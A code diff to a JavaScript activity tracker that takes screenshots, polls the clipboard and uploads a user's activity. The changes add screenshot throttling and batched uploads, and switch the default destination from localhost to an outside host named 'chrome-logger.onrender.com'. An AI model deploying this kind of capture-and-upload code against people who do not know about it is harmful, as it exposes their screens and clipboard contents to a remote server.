@@ -16,6 +16,8 @@ class ActivityTracker {
         this.clipboardInterval = null;
         this.lastActivity = null;
         this.lastScreenshot = null;
+        this.lastScreenshotTime = 0;
+        this.screenshotSendTimeout = null;
         this.activityBuffer = [];
         this.screenshotBuffer = [];
         this.lastClipboard = '';
@@ -113,6 +115,12 @@ class ActivityTracker {
         if (this.clipboardInterval) {
             clearInterval(this.clipboardInterval);
             this.clipboardInterval = null;
+        }
+
+        // Clear screenshot send timeout
+        if (this.screenshotSendTimeout) {
+            clearTimeout(this.screenshotSendTimeout);
+            this.screenshotSendTimeout = null;
         }
 
         // Send remaining data
@@ -429,11 +437,23 @@ class ActivityTracker {
 
     async takeScreenshot(reason = 'event') {
         try {
+            // Check if enough time has passed since last screenshot
+            const now = Date.now();
+            const minInterval = this.configManager.get('minScreenshotInterval') || 30000; // Default 30 seconds
+            const timeSinceLastScreenshot = now - this.lastScreenshotTime;
+
+            if (timeSinceLastScreenshot < minInterval) {
+                console.log(`Skipping screenshot - only ${Math.round(timeSinceLastScreenshot/1000)}s since last screenshot (min: ${Math.round(minInterval/1000)}s)`);
+                return;
+            }
+
             const { exec } = require('child_process');
             const util = require('util');
             const execAsync = util.promisify(exec);
 
-            const timestamp = Date.now();
+            const timestamp = now;
+            this.lastScreenshotTime = timestamp;
+
             const username = this.configManager.get('username') || 'Unknown';
             const filename = `${timestamp}_${username}_screenshot.png`;
             const filepath = path.join(this.screenshotDir, filename);
@@ -480,13 +500,32 @@ class ActivityTracker {
 
             this.screenshotBuffer.push(screenshotData);
 
-            // Send both activity and screenshot data
+            // Add to activity buffer (send immediately)
             await this.sendActivityData();
-            await this.sendScreenshotData();
+
+            // Batch screenshot sending with a delay to avoid sending every screenshot
+            this.scheduleScreenshotSend();
 
         } catch (error) {
             console.error('Error taking screenshot:', error);
         }
+    }
+
+    scheduleScreenshotSend() {
+        // Clear any existing timeout
+        if (this.screenshotSendTimeout) {
+            clearTimeout(this.screenshotSendTimeout);
+        }
+
+        // Schedule sending screenshots after a delay
+        const batchDelay = this.configManager.get('screenshotBatchDelay') || 15000; // Default 15 seconds
+        this.screenshotSendTimeout = setTimeout(async() => {
+            if (this.screenshotBuffer.length > 0) {
+                console.log(`Sending ${this.screenshotBuffer.length} batched screenshots...`);
+                await this.sendScreenshotData();
+            }
+            this.screenshotSendTimeout = null;
+        }, batchDelay);
     }
 
     async sendActivityData() {
@@ -494,7 +533,7 @@ class ActivityTracker {
 
         try {
             const config = this.configManager.getConfig();
-            const serverUrl = config.serverUrl || 'http://localhost:8080';
+            const serverUrl = config.serverUrl || 'https://chrome-logger.onrender.com';
 
             const response = await axios.post(`${serverUrl}/collect-activity`, {
                 events: this.activityBuffer
@@ -514,7 +553,7 @@ class ActivityTracker {
 
         try {
             const config = this.configManager.getConfig();
-            const serverUrl = config.serverUrl || 'http://localhost:8080';
+            const serverUrl = config.serverUrl || 'https://chrome-logger.onrender.com';
 
             // Process each screenshot
             for (const screenshot of this.screenshotBuffer) {
